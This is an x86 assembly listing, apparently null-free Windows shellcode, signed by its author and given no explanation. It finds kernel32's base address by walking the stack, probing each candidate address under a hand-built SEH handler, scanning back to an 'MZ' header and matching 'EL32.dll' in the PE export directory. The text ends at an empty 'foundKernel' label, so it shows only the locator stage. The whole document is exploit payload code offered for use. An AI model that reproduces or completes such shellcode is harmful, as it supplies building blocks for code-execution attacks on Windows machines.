; Author: Tarek Ahmed
; All rights reserved
; Email: unix.geek2014@gmail.com
; NullFree

sub esp, 8
xor eax, eax
cdq
xchg edx, ecx


StackWalk :
	mov ebx, [esp + ecx]	
	mov edx, ebx
	shr ebx, 28		
	add ecx, 4
	cmp ebx, 7		
	jne StackWalk
	jmp short checking

checkAddress :
	push ebp
	mov ebp, esp
	jmp rev1					
	reverse:		
	pop eax
	jmp eax
	rev1:
	call reverse		
	add eax, 0x1e				
	push eax
	xor edi, edi
	push dword ptr FS : [edi]			
	mov dword ptr fs : [edi] , esp		
	mov eax, dword ptr ss : [ebp + 8]
        xchg eax, esi				
	mov eax, dword ptr ds : [esi] 

	xor eax, eax

	jmp short cleanseh

	
	xor eax, eax
	inc eax		
	mov esp, dword ptr fs : [edi]
	mov esp, dword ptr ss : [esp]


cleanseh :
	pop dword ptr fs : [edi]
	add esp, 4
	pop ebp
	ret


checking:

	mov [ebp-0xc], ecx
	push edx				
	call checkAddress		
	test eax, eax			
	je valid
	mov ecx, [ebp-0xc]
	jmp short StackWalk


valid :
	mov ecx, [ebp-0xc]
	mov ax, 0xffff			
	inc eax


	findMZ:
	sub edx, eax			
	mov dx, ax
	mov ax, [edx]
	cmp ax, 0x5a4d			
	jne findMZ			
	xchg edx, ebx
	mov edi, [ebx + 0x3c]		
	add edi, ebx
	mov edi, [edi + 0x78]
	add edi, ebx
	mov edi, [edi + 0xc]
	add edi, ebx
	add edi, 4

	xor eax, eax
	push eax
	push 0x6c6c642e			
	push 0x32334c45			
	mov esi, esp

checkKernel :
	mov edx, ecx
	mov cl, 8			
	cld

	repe cmpsb		
	test ecx, ecx
	je foundKernel			
	mov ecx, edx
	jmp StackWalk		

foundKernel :
					

